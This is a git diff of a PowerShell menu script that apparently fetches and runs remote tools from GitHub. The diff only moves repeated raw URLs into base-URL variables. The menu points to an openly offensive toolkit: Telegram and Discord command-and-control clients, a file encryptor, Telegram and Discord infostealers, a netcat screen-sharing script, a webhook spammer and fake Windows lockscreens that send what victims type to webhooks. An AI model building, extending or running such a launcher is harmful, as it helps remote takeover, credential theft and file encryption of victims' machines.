@@ -61,35 +61,37 @@ Choose an option "
 While ($Option -ne '99'){
 header
 $Option = Read-Host "$list"
+$BaseURL = "https://raw.githubusercontent.com/beigeworm/assets/main/master"
+$PoshcryptURL = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main"
 
     if ($Option -eq '1'){$url = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1"}
     if ($Option -eq '2'){$url = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1"}
-    if ($Option -eq '3'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/NC-Func.ps1"}
+    if ($Option -eq '3'){$url = "$BaseURL/NC-Func.ps1"}
     if ($Option -eq '4'){$url = "https://raw.githubusercontent.com/beigeworm/Posh-LAN/main/Posh-LAN-Tools.ps1"}
 
-    if ($Option -eq '5'){$url = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main/Encryption/Encryptor.ps1"}
-    if ($Option -eq '6'){$url = "https://raw.githubusercontent.com/beigeworm/PoshCryptor/main/Decryption/Decryptor-GUI.ps1"}
+    if ($Option -eq '5'){$url = "$PoshcryptURL/Encryption/Encryptor.ps1"}
+    if ($Option -eq '6'){$url = "$PoshcryptURL/Decryption/Decryptor-GUI.ps1"}
     
-    if ($Option -eq '7'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Search-Folders-For-Filetypes-GUI.ps1"}
-    if ($Option -eq '8'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Record-Screen-GUI.ps1"}
-    if ($Option -eq '9'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Network-Enumeration-GUI.ps1"}
-    if ($Option -eq '10'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Mute-Microphone-GUI.ps1"}
-    if ($Option -eq '11'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Discord-Webhook-Spammer-GUI.ps1"}
-    if ($Option -eq '12'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Social-Search-GUI.ps1"}
-    if ($Option -eq '13'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Desktop-GDI-Efects-GUI.ps1"}
+    if ($Option -eq '7'){$url = "$BaseURL/Search-Folders-For-Filetypes-GUI.ps1"}
+    if ($Option -eq '8'){$url = "$BaseURL/Record-Screen-GUI.ps1"}
+    if ($Option -eq '9'){$url = "$BaseURL/Network-Enumeration-GUI.ps1"}
+    if ($Option -eq '10'){$url = "$BaseURL/Mute-Microphone-GUI.ps1"}
+    if ($Option -eq '11'){$url = "$BaseURL/Discord-Webhook-Spammer-GUI.ps1"}
+    if ($Option -eq '12'){$url = "$BaseURL/Social-Search-GUI.ps1"}
+    if ($Option -eq '13'){$url = "$BaseURL/Desktop-GDI-Efects-GUI.ps1"}
     
-    if ($Option -eq '14'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Telegram-InfoStealer.ps1"}
-    if ($Option -eq '15'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Discord-Infostealer.ps1"}
-    if ($Option -eq '16'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Desktop-Screenshare-over-Netcat.ps1"}
+    if ($Option -eq '14'){$url = "$BaseURL/Telegram-InfoStealer.ps1"}
+    if ($Option -eq '15'){$url = "$BaseURL/Discord-Infostealer.ps1"}
+    if ($Option -eq '16'){$url = "$BaseURL/Desktop-Screenshare-over-Netcat.ps1"}
     
-    if ($Option -eq '17'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Minecraft-Server-Scanner-and-Server-Info.ps1"}
-    if ($Option -eq '18'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Console-Task-Manager.ps1"}
-    if ($Option -eq '19'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Dummy-Folder-Creator.ps1"}
-    if ($Option -eq '20'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Image-to-Console.ps1"}
-    if ($Option -eq '21'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Matrix-Cascade-in-Powershell.ps1"}
+    if ($Option -eq '17'){$url = "$BaseURL/Minecraft-Server-Scanner-and-Server-Info.ps1"}
+    if ($Option -eq '18'){$url = "$BaseURL/Console-Task-Manager.ps1"}
+    if ($Option -eq '19'){$url = "$BaseURL/Dummy-Folder-Creator.ps1"}
+    if ($Option -eq '20'){$url = "$BaseURL/Image-to-Console.ps1"}
+    if ($Option -eq '21'){$url = "$BaseURL/Matrix-Cascade-in-Powershell.ps1"}
     
-    if ($Option -eq '22'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Fake-Windows-10-Lockscreen-to-Webhook.ps1"}
-    if ($Option -eq '23'){$url = "https://raw.githubusercontent.com/beigeworm/assets/main/master/Fake-Windows-11-Lockscreen-to-Webhook.ps1"}
+    if ($Option -eq '22'){$url = "$BaseURL/Fake-Windows-10-Lockscreen-to-Webhook.ps1"}
+    if ($Option -eq '23'){$url = "$BaseURL/Fake-Windows-11-Lockscreen-to-Webhook.ps1"}
 
     if ($Option -eq '99'){Write-Host "Closing Script";sleep 1; break}
     else{Write-Host "No valid option selected."}
